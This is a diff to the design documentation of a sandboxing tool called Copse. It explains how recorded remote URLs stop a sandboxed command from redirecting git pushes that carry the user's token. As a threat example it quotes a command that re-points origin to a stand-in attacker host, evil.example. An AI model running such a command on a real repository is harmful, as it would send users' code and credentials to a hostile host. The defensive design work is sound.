@@ -538,6 +538,17 @@ All of these must hold, or the command takes its ordinary path unchanged
   denies writes to that file. Any other linked worktree refuses. A `core.hooksPath` inside the
   workspace refuses `push` and `pull`; `fetch`, `ls-remote` and `clone` run with hooks off.
 
+A remote's host only counts while its URLs match the ones Copse recorded outside the sandbox
+(`remote-pins.ts`). Contained commands may write the primary checkout's `.git/config` (`git push
+-u` records the upstream there), so `git remote set-url origin https://evil.example/x` would
+otherwise aim the next scoped push at that host. Trusting a workspace records every remote as it
+stands. A repository Copse first sees without that record has only its github.com, gitlab.com and
+bitbucket.org remotes recorded, since its config may already hold a contained command's edits. A
+remote added or re-pointed later is never recorded on sight: it asks until the workspace is
+trusted again. A fetch, pull or push that names a URL or an unknown remote gets no plan, and
+repository `url.*.insteadOf`, `pushInsteadOf` and `http.proxy` refuse the scope, so the host the
+plan names is the host git contacts.
+
 Every one of these hosts accepts writes from anyone holding a token, so the boundary is that only
 the recognised tool runs while the egress is open, not the host name. For GitHub the scoped command
 gets the user's token as `GH_TOKEN`, a git credential helper scoped to `https://github.com` that
